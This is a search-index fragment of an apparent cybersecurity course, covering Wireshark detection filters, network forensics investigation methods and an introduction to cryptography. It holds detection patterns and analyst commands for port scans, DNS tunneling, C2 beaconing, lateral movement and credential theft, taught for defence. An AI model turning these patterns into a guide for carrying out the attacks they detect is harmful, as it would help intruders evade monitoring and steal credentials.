Scripts"},{"location":"LECTURES/unit6/lesson6-2/#detecting-common-attacks","text":"","title":"Detecting Common Attacks"},{"location":"LECTURES/unit6/lesson6-2/#port-scan-detection","text":"SYN scan: tcp.flags.syn == 1 && tcp.flags.ack == 0 Multiple destination ports from same source: Statistics \u2192 Conversations \u2192 TCP Sort by \"Packets A\u2192B\"","title":"Port Scan Detection"},{"location":"LECTURES/unit6/lesson6-2/#arp-spoofing-detection","text":"arp.duplicate-address-detected Or look for: - Same IP with different MACs - Gratuitous ARP from non-gateway","title":"ARP Spoofing Detection"},{"location":"LECTURES/unit6/lesson6-2/#dns-tunneling-detection","text":"dns.qry.name.len > 50 || dns.response.len > 512","title":"DNS Tunneling Detection"},{"location":"LECTURES/unit6/lesson6-2/#http-tunneling","text":"http.request.method == \"CONNECT\"","title":"HTTP Tunneling"},{"location":"LECTURES/unit6/lesson6-2/#brute-force-detection","text":"HTTP: http.response.code == 401 Count 401s per source IP. SSH: tcp.port == 22 && tcp.flags.syn == 1 High volume of connections.","title":"Brute Force Detection"},{"location":"LECTURES/unit6/lesson6-2/#performance-optimization","text":"","title":"Performance Optimization"},{"location":"LECTURES/unit6/lesson6-2/#for-large-captures","text":"Use capture filters (not display filters): # Only HTTP/HTTPS tcpdump -i eth0 -w capture.pcap \"port 80 or port 443\" Split large files: editcap -c 100000 large.pcap split.pcap Index files: Wireshark automatically creates .pcapng indexes for faster access. Use tshark for analysis: Faster than GUI for batch processing.","title":"For Large Captures"},{"location":"LECTURES/unit6/lesson6-2/#practical-scenarios","text":"","title":"Practical Scenarios"},{"location":"LECTURES/unit6/lesson6-2/#scenario-1-investigating-data-exfiltration","text":"Steps: 1. Filter large outbound transfers: tcp.port == 443 && tcp.len > 1000 2. Statistics \u2192 Conversations 3. Identify unusual destinations 4. Follow TCP streams 5. Export objects if HTTP 6. Check DNS queries for suspicious domains","title":"Scenario 1: Investigating Data Exfiltration"},{"location":"LECTURES/unit6/lesson6-2/#scenario-2-malware-c2-analysis","text":"Steps: 1. Find beaconing patterns (I/O Graph) 2. Extract regular connections 3. Filter DNS queries: dns.flags.response == 0 4. Follow TCP streams for C2 traffic 5. Extract IOCs (IPs, domains, URIs)","title":"Scenario 2: Malware C2 Analysis"},{"location":"LECTURES/unit6/lesson6-2/#scenario-3-incident-response","text":"Steps: 1. Timeline with I/O Graph 2. Identify initial compromise time 3. Track lateral movement: smb2 || rdp || winrm 4. Find data exfiltration 5. Extract IOCs 6. Document in timeline","title":"Scenario 3: Incident Response"},{"location":"LECTURES/unit6/lesson6-2/#key-takeaways","text":"Advanced Wireshark skills: - Complex display filters - Protocol-specific analysis - Stream reconstruction - Statistical analysis - Decryption techniques - CLI automation with tshark Detection techniques: - Port scans - ARP spoofing - DNS tunneling - C2 beaconing - Data exfiltration Best practices: - Use appropriate filters - Leverage statistics - Automate with tshark - Create custom profiles - Document findings Remember: - Wireshark shows what happened - Your job is interpreting it - Context is everything - Practice makes perfect Mastering Wireshark takes time. Analyze real traffic, practice with CTF challenges, and review public PCAPs. The more you use it, the more patterns you'll recognize. Next lesson, we'll explore network forensics\u2014using captured traffic as evidence and reconstructing attack timelines.","title":"Key Takeaways"},{"location":"LECTURES/unit6/lesson6-3/","text":"Network Forensics and Incident Investigation Network forensics is the capture, recording, and analysis of network traffic to discover security incidents, understand attacks, and provide evidence. This lesson teaches you how to conduct thorough network investigations. Network Forensics Fundamentals What is Network Forensics? Network forensics involves: - Capturing network traffic - Preserving evidence - Analyzing packet data - Reconstructing events - Identifying attackers - Supporting legal proceedings Different from network security monitoring: - Forensics looks backward (what happened?) - Monitoring looks at present (what's happening now?) - Both use similar tools but different approaches Legal Considerations Chain of custody: - Document who handled evidence - When and where it was collected - How it was stored - Any modifications made Evidence admissibility: - Must be relevant - Must be authentic - Must be complete - Must be reliable Best practices: - Hash all captures (MD5, SHA256) - Write-protect original evidence - Work on copies, not originals - Document every step - Timestamp everything Setting Up for Forensics Network Tap vs SPAN Port Network TAP (Test Access Point): - Physical device - Passive (doesn't affect traffic) - Sees all packets (no drops) - Expensive but reliable - Ideal for forensics SPAN Port (Switch Port Analyzer): - Switch feature (port mirroring) - Free (uses existing hardware) - Can drop packets under load - Easier to deploy - Good for most scenarios Placement considerations: - Internet connection (see all external traffic) - DMZ (monitor public servers) - Internal segments (detect lateral movement) - Critical servers (protect high-value assets) Full Packet Capture Systems Tools: - Security Onion : Complete forensics platform - Moloch : Large-scale packet capture - Stenographer : Google's packet capture system - tcpdump/tshark : Manual capture Storage requirements: 1 Gbps link fully utilized: - 450 GB per hour - 10.8 TB per day - 75.6 TB per week Typical corporate network (20% utilization): - 90 GB per hour - 2.16 TB per day - 15.12 TB per week Retention policies: - Keep everything: Weeks (expensive) - Keep metadata: Months - Keep full packets: Days to weeks - Balance cost vs. investigation needs Investigation Methodology The OSCAR Process O - Obtain Information - When did incident occur? - What systems affected? - What type of incident? - Who reported it? S - Strategize - Define investigation scope - Identify data sources - Determine timeline - Allocate resources C - Collect Evidence - Capture network traffic - Collect logs - Preserve state - Document everything A - Analyze - Process evidence - Identify patterns - Extract IOCs - Reconstruct events R - Report - Document findings - Create timeline - Provide recommendations - Prepare for legal proceedings Initial Triage Quick assessment questions: What happened? Data breach? Malware infection? Unauthorized access? DoS attack? When did it happen? Check logs for timeframe Identify initial compromise Determine duration What's the scope? Single system or multiple? One network segment or multiple? Internal or external attacker? What data is available? Full packet captures? NetFlow data? Firewall logs? IDS alerts? Analysis Techniques Timeline Reconstruction Build chronological timeline: Initial compromise: Phishing email timestamp Malware execution time First C2 connection Reconnaissance: Port scans Network mapping Service enumeration Lateral movement: SMB connections RDP sessions Pass-the-hash attacks Data exfiltration: Large uploads Unusual protocols Off-hours transfers Covering tracks: Log deletion Tool removal Backdoor installation Example timeline: 2024-01-15 14:23:15 - User opens phishing email 2024-01-15 14:23:47 - Macro executes, downloads malware 2024-01-15 14:24:03 - First C2 connection to evil.com 2024-01-15 14:30:12 - Port scan of internal network 2024-01-15 15:45:33 - SMB connection to file server 2024-01-15 16:12:44 - Large file transfer begins 2024-01-15 18:34:22 - Backdoor installed for persistence Identifying the Attacker Attribution is difficult but look for: Network indicators: - Source IP addresses (VPN/Tor?) - Geolocation data - ASN (Autonomous System Number) - Infrastructure patterns Behavioral indicators: - Tools used (custom or public?) - Techniques (match known groups?) - Timing (time zone indicators?) - Targets (specific or opportunistic?) Language indicators: - Error messages - Comments in code - Keyboard layouts - Time formats Never assume attribution is certain - VPNs, proxies, and compromised systems complicate this. Analyzing Specific Attack Types Data Exfiltration Investigation Look for: Large outbound transfers: tcp.len > 1000 && ip.dst != <your_network> Unusual protocols: - FTP from non-FTP servers - SSH from workstations - DNS queries with large responses Off-hours activity: frame.time >= \"2024-01-15 22:00:00\" && frame.time <= \"2024-01-16 06:00:00\" Encrypted channels: ssl || ssh || tls DNS tunneling: dns.qry.name.len > 50 Analysis steps: 1. Identify unusual large transfers 2. Determine destination 3. Extract transferred files if possible 4. Identify compromised accounts 5. Trace back to initial compromise Malware C2 Investigation Beaconing detection: Look for regular intervals in I/O graphs: tshark -r capture.pcap -T fields \\ -e frame.time_relative -e ip.dst | \\ awk '{diff=$1-prev[$2]; prev[$2]=$1; if(diff>55 && diff<65) print $2, diff}' C2 characteristics: - Regular check-ins (every 60 seconds) - Small packet sizes (commands) - Specific user agents - Base64 encoded data - Specific URLs or URI patterns Extract C2 infrastructure: # Get all contacted IPs tshark -r capture.pcap -Y \"tcp.port == 443\" \\ -T fields -e ip.dst | sort -u # Get all DNS queries tshark -r capture.pcap -Y \"dns.flags.response == 0\" \\ -T fields -e dns.qry.name | sort -u Lateral Movement Investigation Look for: SMB connections: smb2.cmd == 5 # Session Setup RDP connections: tcp.port == 3389 WMI/PowerShell remoting: tcp.port == 5985 || tcp.port == 5986 PsExec: smb2.filename contains \"psexecsvc\" Pass-the-hash: ntlmssp.auth.ntlmv2response Create lateral movement map: Source \u2192 Destination \u2192 Method \u2192 Time 10.0.1.5 \u2192 10.0.1.10 \u2192 RDP \u2192 14:23:15 10.0.1.10 \u2192 10.0.1.20 \u2192 SMB \u2192 14:45:22 10.0.1.20 \u2192 10.0.1.50 \u2192 WMI \u2192 15:12:33 Credential Theft Investigation Look for: Kerberos tickets: kerberos.CNameString NTLM authentication: ntlmssp.auth.username LDAP queries: ldap.filter contains \"samaccountname\" Password guessing: http.response.code == 401 Multiple 401s from same source = brute force. Carving and Reconstruction File Carving from PCAPs Extract files from HTTP: Wireshark: File \u2192 Export Objects \u2192 HTTP Command line: # Using tcpflow tcpflow -r capture.pcap -o output_dir # Using binwalk binwalk -e --dd='.*' capture.pcap Extract files from SMB: tshark -r capture.pcap -Y \"smb2.filename\" \\ --export-objects smb,output_dir Reconstructing Sessions Email reconstruction: # Extract SMTP traffic tshark -r capture.pcap -Y \"tcp.port == 25\" \\ -z follow,tcp,ascii,0 > email.txt Web session reconstruction: # Extract HTTP session tshark -r capture.pcap -Y \"tcp.stream == 5\" \\ -z follow,tcp,ascii,5 > session.txt FTP file transfer: # Find data channel tshark -r capture.pcap -Y \"ftp-data\" # Extract file tshark -r capture.pcap -Y \"tcp.stream == 42\" \\ -T fields -e data.data | xxd -r -p > file.bin NetFlow Analysis NetFlow = flow records (not full packets) What NetFlow captures: - Source/Destination IP - Source/Destination Port - Protocol - Byte count - Packet count - Start/End time What it doesn't capture: - Packet contents - Payloads - Exact sequences Advantages: - Much smaller storage - Longer retention possible - Good for big picture analysis - Privacy-friendly Tools: - nfdump - SiLK - Elastic Stack Example queries: # Top talkers nfdump -R /data/flows -s ip/bytes # Find port scans nfdump -R /data/flows 'flags S and not flags A' \\ -o extended | awk '{print $6}' | sort | uniq -c | sort -rn # Large transfers nfdump -R /data/flows 'bytes > 100000000' Creating Investigation Reports Report Structure 1. Executive Summary - What happened (non-technical) - Impact - Key findings - Recommendations 2. Incident Overview - Timeline - Affected systems - Incident type - Attack vector 3. Technical Analysis - Evidence sources - Analysis methodology - Detailed findings - IOCs 4. Timeline of Events - Chronological reconstruction - Key events highlighted - Evidence references 5. Indicators of Compromise - File hashes - IP addresses - Domain names - URLs - Registry keys - Filenames 6. Attack Attribution - TTPs observed - Tool identification - Possible threat actors - Confidence level 7. Containment & Remediation - Actions taken - Systems isolated - Accounts disabled - Patches applied 8. Recommendations - Short-term fixes - Long-term improvements - Policy changes - Training needs 9. Appendices - Raw evidence - Full packet captures - Log excerpts - Screenshots Visualization Create visual aids: Network diagram: - Show attack path - Indicate compromised systems - Mark entry/exit points Timeline visualization: - Graphical timeline - Major events marked - Duration indicators Traffic graphs: - Volume over time - Spikes during attack - Normal vs. attack traffic Attack tree: - Initial access - Privilege escalation - Lateral movement - Objectives achieved Automated Analysis RITA (Real Intelligence Threat Analytics) Detects: - Beaconing - DNS tunneling - Long connections - Blacklisted IPs/domains # Import data rita import /path/to/zeek/logs dataset_name # Show beacons rita show-beacons dataset_name # Show long connections rita show-long-connections dataset_name # HTML report rita html-report dataset_name Zeek (formerly Bro) Network security monitor: # Analyze pcap zeek -r capture.pcap # Generated logs: # conn.log - Connections # http.log - HTTP requests # dns.log - DNS queries # ssl.log - SSL/TLS connections # files.log - Files transferred Query logs: # Find large uploads cat conn.log | zeek-cut id.orig_h id.resp_h \\ id.resp_p orig_bytes | awk '$4 > 1000000' # Extract all DNS queries cat dns.log | zeek-cut query | sort -u # Find HTTP POST requests cat http.log | zeek-cut method uri | grep POST Key Takeaways Network forensics skills: - Evidence collection and preservation - Timeline reconstruction - Attack pattern recognition - Attribution analysis - Report writing Investigation approach: - Methodical and documented - Focus on answering key questions - Build comprehensive timeline - Extract actionable IOCs - Provide clear recommendations Tools and techniques: - Wireshark for deep analysis - tshark for automation - NetFlow for big picture - Zeek for security monitoring - RITA for automated detection Remember: - Treat everything as evidence - Document exhaustively - Maintain chain of custody - Work on copies, not originals - Time is critical (data retention) Network forensics is detective work. You're piecing together what happened from digital traces. Practice builds intuition\u2014the more investigations you conduct, the faster you'll spot patterns and identify threats. Next, we'll move into applied cryptography and how encryption is actually used to secure systems and communications.","title":"Lesson 6.3"},{"location":"LECTURES/unit6/lesson6-3/#network-forensics-and-incident-investigation","text":"Network forensics is the capture, recording, and analysis of network traffic to discover security incidents, understand attacks, and provide evidence. This lesson teaches you how to conduct thorough network investigations.","title":"Network Forensics and Incident Investigation"},{"location":"LECTURES/unit6/lesson6-3/#network-forensics-fundamentals","text":"","title":"Network Forensics Fundamentals"},{"location":"LECTURES/unit6/lesson6-3/#what-is-network-forensics","text":"Network forensics involves: - Capturing network traffic - Preserving evidence - Analyzing packet data - Reconstructing events - Identifying attackers - Supporting legal proceedings Different from network security monitoring: - Forensics looks backward (what happened?) - Monitoring looks at present (what's happening now?) - Both use similar tools but different approaches","title":"What is Network Forensics?"},{"location":"LECTURES/unit6/lesson6-3/#legal-considerations","text":"Chain of custody: - Document who handled evidence - When and where it was collected - How it was stored - Any modifications made Evidence admissibility: - Must be relevant - Must be authentic - Must be complete - Must be reliable Best practices: - Hash all captures (MD5, SHA256) - Write-protect original evidence - Work on copies, not originals - Document every step - Timestamp everything","title":"Legal Considerations"},{"location":"LECTURES/unit6/lesson6-3/#setting-up-for-forensics","text":"","title":"Setting Up for Forensics"},{"location":"LECTURES/unit6/lesson6-3/#network-tap-vs-span-port","text":"Network TAP (Test Access Point): - Physical device - Passive (doesn't affect traffic) - Sees all packets (no drops) - Expensive but reliable - Ideal for forensics SPAN Port (Switch Port Analyzer): - Switch feature (port mirroring) - Free (uses existing hardware) - Can drop packets under load - Easier to deploy - Good for most scenarios Placement considerations: - Internet connection (see all external traffic) - DMZ (monitor public servers) - Internal segments (detect lateral movement) - Critical servers (protect high-value assets)","title":"Network Tap vs SPAN Port"},{"location":"LECTURES/unit6/lesson6-3/#full-packet-capture-systems","text":"Tools: - Security Onion : Complete forensics platform - Moloch : Large-scale packet capture - Stenographer : Google's packet capture system - tcpdump/tshark : Manual capture Storage requirements: 1 Gbps link fully utilized: - 450 GB per hour - 10.8 TB per day - 75.6 TB per week Typical corporate network (20% utilization): - 90 GB per hour - 2.16 TB per day - 15.12 TB per week Retention policies: - Keep everything: Weeks (expensive) - Keep metadata: Months - Keep full packets: Days to weeks - Balance cost vs. investigation needs","title":"Full Packet Capture Systems"},{"location":"LECTURES/unit6/lesson6-3/#investigation-methodology","text":"","title":"Investigation Methodology"},{"location":"LECTURES/unit6/lesson6-3/#the-oscar-process","text":"O - Obtain Information - When did incident occur? - What systems affected? - What type of incident? - Who reported it? S - Strategize - Define investigation scope - Identify data sources - Determine timeline - Allocate resources C - Collect Evidence - Capture network traffic - Collect logs - Preserve state - Document everything A - Analyze - Process evidence - Identify patterns - Extract IOCs - Reconstruct events R - Report - Document findings - Create timeline - Provide recommendations - Prepare for legal proceedings","title":"The OSCAR Process"},{"location":"LECTURES/unit6/lesson6-3/#initial-triage","text":"Quick assessment questions: What happened? Data breach? Malware infection? Unauthorized access? DoS attack? When did it happen? Check logs for timeframe Identify initial compromise Determine duration What's the scope? Single system or multiple? One network segment or multiple? Internal or external attacker? What data is available? Full packet captures? NetFlow data? Firewall logs? IDS alerts?","title":"Initial Triage"},{"location":"LECTURES/unit6/lesson6-3/#analysis-techniques","text":"","title":"Analysis Techniques"},{"location":"LECTURES/unit6/lesson6-3/#timeline-reconstruction","text":"Build chronological timeline: Initial compromise: Phishing email timestamp Malware execution time First C2 connection Reconnaissance: Port scans Network mapping Service enumeration Lateral movement: SMB connections RDP sessions Pass-the-hash attacks Data exfiltration: Large uploads Unusual protocols Off-hours transfers Covering tracks: Log deletion Tool removal Backdoor installation Example timeline: 2024-01-15 14:23:15 - User opens phishing email 2024-01-15 14:23:47 - Macro executes, downloads malware 2024-01-15 14:24:03 - First C2 connection to evil.com 2024-01-15 14:30:12 - Port scan of internal network 2024-01-15 15:45:33 - SMB connection to file server 2024-01-15 16:12:44 - Large file transfer begins 2024-01-15 18:34:22 - Backdoor installed for persistence","title":"Timeline Reconstruction"},{"location":"LECTURES/unit6/lesson6-3/#identifying-the-attacker","text":"Attribution is difficult but look for: Network indicators: - Source IP addresses (VPN/Tor?) - Geolocation data - ASN (Autonomous System Number) - Infrastructure patterns Behavioral indicators: - Tools used (custom or public?) - Techniques (match known groups?) - Timing (time zone indicators?) - Targets (specific or opportunistic?) Language indicators: - Error messages - Comments in code - Keyboard layouts - Time formats Never assume attribution is certain - VPNs, proxies, and compromised systems complicate this.","title":"Identifying the Attacker"},{"location":"LECTURES/unit6/lesson6-3/#analyzing-specific-attack-types","text":"","title":"Analyzing Specific Attack Types"},{"location":"LECTURES/unit6/lesson6-3/#data-exfiltration-investigation","text":"Look for: Large outbound transfers: tcp.len > 1000 && ip.dst != <your_network> Unusual protocols: - FTP from non-FTP servers - SSH from workstations - DNS queries with large responses Off-hours activity: frame.time >= \"2024-01-15 22:00:00\" && frame.time <= \"2024-01-16 06:00:00\" Encrypted channels: ssl || ssh || tls DNS tunneling: dns.qry.name.len > 50 Analysis steps: 1. Identify unusual large transfers 2. Determine destination 3. Extract transferred files if possible 4. Identify compromised accounts 5. Trace back to initial compromise","title":"Data Exfiltration Investigation"},{"location":"LECTURES/unit6/lesson6-3/#malware-c2-investigation","text":"Beaconing detection: Look for regular intervals in I/O graphs: tshark -r capture.pcap -T fields \\ -e frame.time_relative -e ip.dst | \\ awk '{diff=$1-prev[$2]; prev[$2]=$1; if(diff>55 && diff<65) print $2, diff}' C2 characteristics: - Regular check-ins (every 60 seconds) - Small packet sizes (commands) - Specific user agents - Base64 encoded data - Specific URLs or URI patterns Extract C2 infrastructure: # Get all contacted IPs tshark -r capture.pcap -Y \"tcp.port == 443\" \\ -T fields -e ip.dst | sort -u # Get all DNS queries tshark -r capture.pcap -Y \"dns.flags.response == 0\" \\ -T fields -e dns.qry.name | sort -u","title":"Malware C2 Investigation"},{"location":"LECTURES/unit6/lesson6-3/#lateral-movement-investigation","text":"Look for: SMB connections: smb2.cmd == 5 # Session Setup RDP connections: tcp.port == 3389 WMI/PowerShell remoting: tcp.port == 5985 || tcp.port == 5986 PsExec: smb2.filename contains \"psexecsvc\" Pass-the-hash: ntlmssp.auth.ntlmv2response Create lateral movement map: Source \u2192 Destination \u2192 Method \u2192 Time 10.0.1.5 \u2192 10.0.1.10 \u2192 RDP \u2192 14:23:15 10.0.1.10 \u2192 10.0.1.20 \u2192 SMB \u2192 14:45:22 10.0.1.20 \u2192 10.0.1.50 \u2192 WMI \u2192 15:12:33","title":"Lateral Movement Investigation"},{"location":"LECTURES/unit6/lesson6-3/#credential-theft-investigation","text":"Look for: Kerberos tickets: kerberos.CNameString NTLM authentication: ntlmssp.auth.username LDAP queries: ldap.filter contains \"samaccountname\" Password guessing: http.response.code == 401 Multiple 401s from same source = brute force.","title":"Credential Theft Investigation"},{"location":"LECTURES/unit6/lesson6-3/#carving-and-reconstruction","text":"","title":"Carving and Reconstruction"},{"location":"LECTURES/unit6/lesson6-3/#file-carving-from-pcaps","text":"Extract files from HTTP: Wireshark: File \u2192 Export Objects \u2192 HTTP Command line: # Using tcpflow tcpflow -r capture.pcap -o output_dir # Using binwalk binwalk -e --dd='.*' capture.pcap Extract files from SMB: tshark -r capture.pcap -Y \"smb2.filename\" \\ --export-objects smb,output_dir","title":"File Carving from PCAPs"},{"location":"LECTURES/unit6/lesson6-3/#reconstructing-sessions","text":"Email reconstruction: # Extract SMTP traffic tshark -r capture.pcap -Y \"tcp.port == 25\" \\ -z follow,tcp,ascii,0 > email.txt Web session reconstruction: # Extract HTTP session tshark -r capture.pcap -Y \"tcp.stream == 5\" \\ -z follow,tcp,ascii,5 > session.txt FTP file transfer: # Find data channel tshark -r capture.pcap -Y \"ftp-data\" # Extract file tshark -r capture.pcap -Y \"tcp.stream == 42\" \\ -T fields -e data.data | xxd -r -p > file.bin","title":"Reconstructing Sessions"},{"location":"LECTURES/unit6/lesson6-3/#netflow-analysis","text":"NetFlow = flow records (not full packets) What NetFlow captures: - Source/Destination IP - Source/Destination Port - Protocol - Byte count - Packet count - Start/End time What it doesn't capture: - Packet contents - Payloads - Exact sequences Advantages: - Much smaller storage - Longer retention possible - Good for big picture analysis - Privacy-friendly Tools: - nfdump - SiLK - Elastic Stack Example queries: # Top talkers nfdump -R /data/flows -s ip/bytes # Find port scans nfdump -R /data/flows 'flags S and not flags A' \\ -o extended | awk '{print $6}' | sort | uniq -c | sort -rn # Large transfers nfdump -R /data/flows 'bytes > 100000000'","title":"NetFlow Analysis"},{"location":"LECTURES/unit6/lesson6-3/#creating-investigation-reports","text":"","title":"Creating Investigation Reports"},{"location":"LECTURES/unit6/lesson6-3/#report-structure","text":"1. Executive Summary - What happened (non-technical) - Impact - Key findings - Recommendations 2. Incident Overview - Timeline - Affected systems - Incident type - Attack vector 3. Technical Analysis - Evidence sources - Analysis methodology - Detailed findings - IOCs 4. Timeline of Events - Chronological reconstruction - Key events highlighted - Evidence references 5. Indicators of Compromise - File hashes - IP addresses - Domain names - URLs - Registry keys - Filenames 6. Attack Attribution - TTPs observed - Tool identification - Possible threat actors - Confidence level 7. Containment & Remediation - Actions taken - Systems isolated - Accounts disabled - Patches applied 8. Recommendations - Short-term fixes - Long-term improvements - Policy changes - Training needs 9. Appendices - Raw evidence - Full packet captures - Log excerpts - Screenshots","title":"Report Structure"},{"location":"LECTURES/unit6/lesson6-3/#visualization","text":"Create visual aids: Network diagram: - Show attack path - Indicate compromised systems - Mark entry/exit points Timeline visualization: - Graphical timeline - Major events marked - Duration indicators Traffic graphs: - Volume over time - Spikes during attack - Normal vs. attack traffic Attack tree: - Initial access - Privilege escalation - Lateral movement - Objectives achieved","title":"Visualization"},{"location":"LECTURES/unit6/lesson6-3/#automated-analysis","text":"","title":"Automated Analysis"},{"location":"LECTURES/unit6/lesson6-3/#rita-real-intelligence-threat-analytics","text":"Detects: - Beaconing - DNS tunneling - Long connections - Blacklisted IPs/domains # Import data rita import /path/to/zeek/logs dataset_name # Show beacons rita show-beacons dataset_name # Show long connections rita show-long-connections dataset_name # HTML report rita html-report dataset_name","title":"RITA (Real Intelligence Threat Analytics)"},{"location":"LECTURES/unit6/lesson6-3/#zeek-formerly-bro","text":"Network security monitor: # Analyze pcap zeek -r capture.pcap # Generated logs: # conn.log - Connections # http.log - HTTP requests # dns.log - DNS queries # ssl.log - SSL/TLS connections # files.log - Files transferred Query logs: # Find large uploads cat conn.log | zeek-cut id.orig_h id.resp_h \\ id.resp_p orig_bytes | awk '$4 > 1000000' # Extract all DNS queries cat dns.log | zeek-cut query | sort -u # Find HTTP POST requests cat http.log | zeek-cut method uri | grep POST","title":"Zeek (formerly Bro)"},{"location":"LECTURES/unit6/lesson6-3/#key-takeaways","text":"Network forensics skills: - Evidence collection and preservation - Timeline reconstruction - Attack pattern recognition - Attribution analysis - Report writing Investigation approach: - Methodical and documented - Focus on answering key questions - Build comprehensive timeline - Extract actionable IOCs - Provide clear recommendations Tools and techniques: - Wireshark for deep analysis - tshark for automation - NetFlow for big picture - Zeek for security monitoring - RITA for automated detection Remember: - Treat everything as evidence - Document exhaustively - Maintain chain of custody - Work on copies, not originals - Time is critical (data retention) Network forensics is detective work. You're piecing together what happened from digital traces. Practice builds intuition\u2014the more investigations you conduct, the faster you'll spot patterns and identify threats. Next, we'll move into applied cryptography and how encryption is actually used to secure systems and communications.","title":"Key Takeaways"},{"location":"LECTURES/unit7/lesson7-1/","text":"Cryptography and Access Control You've seen how easily data can be intercepted on networks. Now let's talk about how to protect it. Cryptography is the practice of securing information by transforming it into an unreadable format. It's the foundation of digital security\u2014from HTTPS to messaging apps to cryptocurrency. What is Cryptography? Cryptography comes from Greek words meaning \"hidden writing.\" It's the science of using mathematical algorithms to: - Confidentiality : Keep data secret - Integrity : Ensure data hasn't been modified - Authentication : Verify identity - Non-repudiation : Prove actions can't be denied Without cryptography, the internet as we know it couldn't exist. Every secure transaction, every private message, every protected password relies on cryptographic principles. The Basics: Plaintext and Ciphertext Plaintext : The original, readable data Ciphertext : The encrypted, unreadable data Encryption : Converting plaintext to ciphertext Decryption : Converting ciphertext back to plaintext Key : Secret value used in encryption/decryption Algorithm (Cipher) : The mathematical process for encryption The goal: without the key, ciphertext should be computationally infeasible to decrypt, even if you know the algorithm. Symmetric Encryption Symmetric encryption uses the same key for both encryption and decryption. It's like a locked box\u2014the same key locks and unlocks it. How It Works Plaintext \u2192 [Encryption Algorithm + Key] \u2192 Ciphertext Ciphertext \u2192 [Decryption Algorithm + Same Key] \u2192 Plaintext Advantages: - Fast and efficient - Simple to implement - Good for encrypting large amounts of data Disadvantage: - Key distribution problem: how do you securely share the key? Common Symmetric Algorithms AES (Advanced Encryption Standard): - Current industry standard - Key sizes: 128, 192, or 256 bits - Used everywhere: HTTPS, VPNs, disk encryption, file encryption - Extremely secure when properly implemented - Fast in both hardware and software DES (Data Encryption Standard): - Old standard from 1970s - 56-bit key (too small\u2014can be brute forced) - Deprecated, no longer secure - Historic importance only 3DES (Triple DES): - Applies DES three times with different keys - More secure than DES but slower - Being phased out in favor of AES ChaCha20: - Modern stream cipher - Alternative to AES - Fast on devices without AES hardware acceleration - Used in TLS, SSH, VPNs Block vs. Stream Ciphers Block ciphers (like AES): - Encrypt fixed-size blocks of data (128 bits for AES) - Need padding if data isn't a multiple of block size - Require modes of operation (ECB, CBC, CTR, GCM) Stream ciphers (like ChaCha20): - Encrypt data bit by bit or byte by byte - No padding needed - Often faster for streaming data Modes of Operation Block ciphers need a mode to handle multiple blocks: ECB (Electronic Codebook) - DON'T USE: - Each block encrypted independently - Same plaintext block = same ciphertext block - Patterns visible in encrypted data - Insecure for most purposes CBC (Cipher Block Chaining) : - Each block XORed with previous ciphertext - Requires initialization vector (IV) - Sequential processing - Common but being replaced CTR (Counter) : - Turns block cipher into stream cipher - Can be parallelized (faster) - Used in modern protocols GCM (Galois/Counter Mode) : - Provides encryption + authentication - Current best practice - Used in TLS 1.3, WPA3 - Fast and secure Asymmetric Encryption (Public Key Cryptography) Asymmetric encryption uses two different keys: a public key (shared openly) and a private key (kept secret). How It Works Plaintext \u2192 [Encryption + Public Key] \u2192 Ciphertext Ciphertext \u2192 [Decryption + Private Key] \u2192 Plaintext Anyone can encrypt with your public key, but only you can decrypt with your private key. Advantages: - Solves key distribution problem - Enables digital signatures - Foundation of secure communications Disadvantages: - Slower than symmetric encryption - More computationally intensive - Larger key sizes needed Common Asymmetric Algorithms RSA (Rivest-Shamir-Adleman): - Most widely used - Key sizes: 2048, 3072, 4096 bits (2048 minimum today) - Based on difficulty of factoring large numbers - Used for key exchange, digital signatures - Quantum computers threaten RSA's future ECC (Elliptic Curve Cryptography): - Smaller keys, same security as RSA - 256-bit ECC \u2248 3072-bit RSA - Faster and more efficient - Growing in popularity - Examples: ECDSA (signatures), ECDH (key exchange) Diffie-Hellman: - Key exchange protocol - Allows two parties to agree on shared secret over insecure channel - Doesn't encrypt data directly - Foundation of forward secrecy ElGamal: - Alternative to RSA - Used in PGP/GPG - Based on discrete logarithm problem Hybrid Cryptography In practice, we use both symmetric and asymmetric: Use asymmetric encryption to exchange a symmetric key Use symmetric encryption for actual data (faster) This is how HTTPS, VPNs, and encrypted messaging work Example TLS handshake: 1. Client and server use RSA or ECDH to agree on a symmetric key 2. All subsequent traffic encrypted with AES using that key 3. Best of both worlds: secure key exchange + fast encryption Hash Functions Hash functions are one-way cryptographic operations that produce a fixed-size output (hash/digest) from any input. Properties of Cryptographic Hashes Deterministic : Same input always produces same output Fast : Quick to compute One-way : Computationally infeasible to reverse Avalanche effect : Small input change drastically changes output Collision resistant : Hard to find two inputs with same hash Common Hash Functions MD5 (Message Digest 5): - 128-bit hash - BROKEN - collision attacks practical - Still seen but DO NOT USE for security - OK for checksums only SHA-1 (Secure Hash Algorithm 1): - 160-bit hash - BROKEN - collision attacks demonstrated (2017) - Being phased out everywhere - Don't use for new projects SHA-2 Family (SHA-224, SHA-256, SHA-384, SHA-512): - Current standard - SHA-256 most common (256-bit hash) - Very secure - Used in TLS, Bitcoin, code signing SHA-3: - Latest standard - Different algorithm than SHA-2 - Not widely adopted yet but available - Insurance against SHA-2 vulnerabilities BLAKE2: - Fast alternative to SHA-2 - As secure as SHA-3 - Used in some modern systems Uses of Hash Functions Password Storage: Never store passwords in plaintext. Hash them: import hashlib password = \"user_password123\" hash_obj = hashlib.sha256(password.encode()) stored_hash = hash_obj.hexdigest() # Store: stored_hash in database To verify login: login_attempt = \"user_password123\" attempt_hash = hashlib.sha256(login_attempt.encode()).hexdigest() if attempt_hash == stored_hash: print(\"Login successful\") But simple hashing isn't enough! Attackers use rainbow tables (precomputed hashes). Salt : Random data added to password before hashing: import os import hashlib salt = os.urandom(32) # Random 32 bytes password = \"user_password123\" hash_input = salt + password.encode() password_hash = hashlib.sha256(hash_input).hexdigest() # Store both salt and hash # Each user gets unique salt, so same password \u2192 different hashes Even better : Use specialized password hashing algorithms: - bcrypt : Deliberately slow, has built-in salt - scrypt : Memory-hard (resists specialized hardware) - Argon2 : Winner of password hashing competition, current best practice File Integrity: Hash files to detect tampering: sha256sum file.txt # Output: hash value that uniquely identifies file contents Digital Signatures: Hash the message, encrypt hash with private key = signature Blockchain/Cryptocurrency: Each block contains hash of previous block, creating immutable chain Digital Signatures Digital signatures prove authenticity and integrity using asymmetric cryptography. How They Work Signing: 1. Hash the document 2. Encrypt hash with sender's private key 3. This encrypted hash is the signature Verifying: 1. Hash the received document 2. Decrypt signature with sender's public key 3. Compare: if hashes match, signature valid What this proves: - Authenticity : Only holder of private key could create this signature - Integrity : If document changed, hash won't match - Non-repudiation : Signer can't deny signing Uses Code signing (verify software hasn't been tampered) Email signatures (PGP/GPG) Legal documents 